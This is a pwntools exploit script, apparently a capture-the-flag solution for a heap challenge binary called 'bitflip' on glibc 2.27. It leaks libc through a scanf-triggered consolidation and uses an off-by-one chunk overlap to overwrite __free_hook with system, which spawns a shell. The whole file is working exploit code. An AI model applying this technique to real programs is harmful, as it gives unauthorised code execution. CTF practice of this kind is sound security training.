from pwn import *

def add(idx, size):
    p.recvuntil(b'Your choice: ')
    p.sendline(b'1')
    p.recvuntil(b'Index: ')
    p.sendline(str(idx))
    p.recvuntil('Size')
    p.sendline(str(size))

def edit(idx, content):
    p.recvuntil(b'Your choice: ')
    p.sendline(b'2')
    p.recvuntil(b'Index: ')
    p.sendline(str(idx))
    p.recvuntil(b'Content: ')
    p.sendline(content)

def show(idx):
    p.recvuntil(b'Your choice: ')
    p.sendline(b'3')
    p.recvuntil(b'Index: ')
    p.sendline(str(idx))

def delete(idx):
    p.recvuntil(b'Your choice: ')
    p.sendline(b'4')
    p.recvuntil(b'Index: ')
    p.sendline(str(idx))

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = process('./bitflip')
elf = ELF('./bitflip')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

for i in range(7):
    add(i, 0x18)
add(7, 0x18)
add(8, 0x18)
add(9, 0x18)

add(10, 0x10)
add(11, 0x30)
add(12, 0x18)
for i in range(7):
    delete(i)
delete(7)
delete(8)

'''
scanf("%d", &n);
If you input a very large number, scanf will allocate a big chunk and free it before return.
This will make chunks in fastbins move into smallbins, which is helpful for us to leak libc.
'''
p.recvuntil(b'Your choice: ')
p.sendline(b'1')
p.recvuntil(b'Index: ')
p.sendline(b'9' * 0x5000)
add(20, 0x20)
show(20)
p.recvuntil(b'Content: ')
libc_base = u64(p.recvline()[:-1] + b'\x00' * 0x2) - 0x3ebcd0
print("libc base:", hex(libc_base))
system = libc_base + libc.symbols['system']
free_hook = libc_base + libc.symbols['__free_hook']

'''
use off-by-one to cause chunk overlap.
'''
delete(11)
edit(9, b'\x00' * 0x18 + b'\x61')
delete(10)
add(21, 0x50)
'''
overwrite free_hook
'''
edit(21, b'\x00' * 0x18 + p64(0x41) + p64(free_hook))

'''
get shell
'''
add(22, 0x30)
add(23, 0x30) #free_hook
edit(22, b'/bin/sh\x00')
edit(23, p64(system))
delete(22)

p.interactive()
